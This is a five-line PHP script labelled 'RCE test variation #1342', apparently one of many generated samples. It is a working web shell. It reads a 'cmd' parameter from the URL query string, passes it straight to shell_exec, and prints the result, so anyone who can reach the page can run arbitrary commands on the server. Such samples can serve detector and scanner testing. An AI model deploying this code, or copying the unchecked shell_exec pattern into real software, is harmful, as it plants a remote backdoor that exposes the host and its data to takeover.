<?php
// RCE test variation #1342
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>